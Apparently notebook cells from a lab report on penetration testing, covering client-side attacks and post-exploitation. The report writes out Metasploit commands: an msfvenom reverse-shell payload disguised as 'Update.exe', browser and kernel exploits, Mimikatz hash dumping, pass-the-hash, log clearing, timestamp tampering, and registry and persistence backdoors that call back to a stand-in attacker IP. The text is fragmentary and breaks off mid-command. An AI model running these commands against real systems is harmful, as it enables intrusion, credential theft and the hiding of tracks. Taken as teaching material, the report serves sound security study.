    "## **Introduction**  \n",
    "Penetration testing is a simulated cyberattack against a system to identify vulnerabilities before malicious hackers exploit them. This report covers **DIY Project-2 – Penetration Testing Part-2**, which includes:  \n",
    "1. **Client-Side Attacks**  \n",
    "2. **Post-Exploitation**  \n",
    "3. **Maintaining Access**  \n",
    "4. **Documentation & Reporting**  \n",
    "\n",
    "All tasks were performed in a controlled lab environment for educational purposes only.  \n",
    "\n",
    "---\n",
    "\n",
    "## **1. Client-Side Attacks**  \n",
    "\n",
    "### **(a) Binary Payloads**  \n",
    "- Created a malicious binary payload using **msfvenom** (Metasploit Framework).  \n",
    "- Example Command:  \n",
    "  ```bash\n",
    "  msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Attacker_IP> LPORT=4444 -f exe > payload.exe\n",
    "  ```\n",
    "- The payload was disguised as a legitimate file (e.g., \"Update.exe\") and delivered via email or USB.  \n",
    "- Upon execution, it established a reverse shell connection.  \n",
    "\n",
    "### **(b) Client-Side Exploits**  \n",
    "- Exploited vulnerabilities in outdated software (e.g., Adobe Reader, browsers).  \n",
    "- Used **Exploit-DB** to find public exploits.  \n",
    "- Example:  \n",
    "  ```bash\n",
    "  use exploit/windows/browser/adobe_flash_avm2\n",
    "  set payload windows/meterpreter/reverse_tcp\n",
    "  exploit\n",
    "  ```\n",
    "\n",
    "### **(c) Social Engineering Toolkit (SET)**  \n",
    "- Launched phishing attacks using **SET** to trick users into executing malicious files.  \n",
    "- Steps:  \n",
    "  1. `setoolkit` → `Social-Engineering Attacks` → `Spear-Phishing Attack Vectors`  \n",
    "  2. Created a fake PDF with embedded malware.  \n",
    "  3. Sent via email to the target.  \n",
    "\n",
    "### **(d) Privilege Escalation**  \n",
    "- Used **Windows Kernel Exploits** (e.g., **CVE-2018-8120**) to gain admin access.  \n",
    "- Example:  \n",
    "  ```bash\n",
    "  use exploit/windows/local/ms16_032_secondary_logon_handle_privesc\n",
    "  set SESSION <session_id>\n",
    "  exploit\n",

    "\n",
    "## **2. Post-Exploitation**  \n",
    "\n",
    "### **(a) Privilege Escalation**  \n",
    "- Used **getsystem** in Meterpreter to escalate privileges.  \n",
    "- Checked for misconfigured services (`whoami /priv`).  \n",
    "\n",
    "### **(b) Pass the Hash**  \n",
    "- Extracted NTLM hashes using **Mimikatz**:  \n",
    "  ```bash\n",
    "  meterpreter > load kiwi  \n",
    "  meterpreter > lsa_dump_sam  \n",
    "  ```\n",
    "- Used extracted hash to authenticate (`pth-winexe -U admin%hash //target cmd`).  \n",
    "\n",
    "### **(c) Clear Event Logs**  \n",
    "- Cleared logs to avoid detection:  \n",
    "  ```bash\n",
    "  meterpreter > clearev\n",
    "  ```\n",
    "\n",
    "### **(d) Interacting with the Registry**  \n",
    "- Modified registry keys for persistence:  \n",
    "  ```bash\n",
    "  meterpreter > reg setval -k HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run -v \"Backdoor\" -d \"C:\\\\malware.exe\"\n",
    "  ```\n",
    "\n",
    "### **(e) Packet Sniffing**  \n",
    "- Captured network traffic using **Wireshark** and **Tcpdump**.  \n",
    "\n",
    "### **(f) Screen Capture**  \n",
    "- Took screenshots of the victim’s desktop:  \n",
    "  ```bash\n",
    "  meterpreter > screenshot\n",
    "  ```\n",
    "\n",
    "### **(g) Searching for Content**  \n",
    "- Searched for sensitive files:  \n",
    "  ```bash\n",
    "  meterpreter > search -f *.docx\n",
    "  ```\n",
    "\n",
    "### **(h) Time Stamp Manipulation**  \n",
    "- Modified file timestamps to hide activity:  \n",
    "  ```bash\n",
    "  meterpreter > timestomp file.txt -f \"01/01/2020 00:00:00\"\n",
    "  ```\n",
    "\n",
    "### **(i) John the Ripper**  \n",
    "- Cracked passwords from dumped hashes:  \n",
    "  ```bash\n",
    "  john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt\n",
    "  ```\n",
    "\n",
    "---\n",

    "### **(b) Persistent Backdoors**  \n",
    "- Installed a backdoor for future access:  \n",
    "  ```bash\n",
    "  meterpreter > run persistence -X -i 60 -p 4444 -r <Attacker_IP>\n",
